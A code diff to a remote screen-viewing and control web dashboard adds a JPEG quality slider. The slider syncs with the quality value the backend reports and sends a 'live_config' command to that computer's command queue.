@@ -150,6 +150,10 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
       <button class="btn btn-ghost btn-sm" id="mouseBtn" onclick="toggleMouse()">OFF</button>
       <span class="label">Keyboard:</span>
       <button class="btn btn-ghost btn-sm" id="keyBtn" onclick="toggleKeyboard()">OFF</button>
+      <span class="sep">|</span>
+      <span class="label">Quality:</span>
+      <input type="range" id="liveQuality" min="5" max="50" value="25" style="width:60px;vertical-align:middle" oninput="liveQualityVal.textContent=this.value;sendLiveConfig()">
+      <span id="liveQualityVal" style="color:rgba(255,255,255,.5);font-size:.7rem;min-width:1.5rem">25</span>
       <span id="screenFps" style="color:rgba(255,255,255,.2);font-size:.75rem;margin-left:auto"></span>
     </div>
     <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
@@ -345,6 +349,7 @@ async function pollScreen(){
    const row=await r.json();
    if(row&&row.result){
     screenScale=parseFloat(row.scale)||1;
+    if(row.q){document.getElementById('liveQuality').value=row.q;document.getElementById('liveQualityVal').textContent=row.q;}
     const t=new Date(row.created_at).getTime();
     if(Date.now()-t<30000){
      const el=document.getElementById('screenResult');const imgSrc='data:image/jpeg;base64,'+row.result;
@@ -370,8 +375,11 @@ async function pollScreen(){
    }
   }
  }catch{}
- setTimeout(pollScreen,100);
+   setTimeout(pollScreen,100);
 }
+
+async function sendLiveConfig(){const q=document.getElementById('liveQuality').value;try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'live_config',payload:JSON.stringify({quality:parseInt(q)}),status:'pending'})});}catch{}}
+
 
 function setupCanvas(){const img=document.getElementById('screenImg');const c=document.getElementById('screenCanvas');if(!img||!c)return;const resize=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px';};img.onload=resize;setTimeout(resize,100);}
 function getScreenCoords(e){const c=document.getElementById('screenCanvas');const img=document.getElementById('screenImg');if(!c||!img)return null;const rect=c.getBoundingClientRect();const s=screenScale||1;return{x:Math.round((e.clientX-rect.left)*img.naturalWidth/c.width/s),y:Math.round((e.clientY-rect.top)*img.naturalHeight/c.height/s)};}
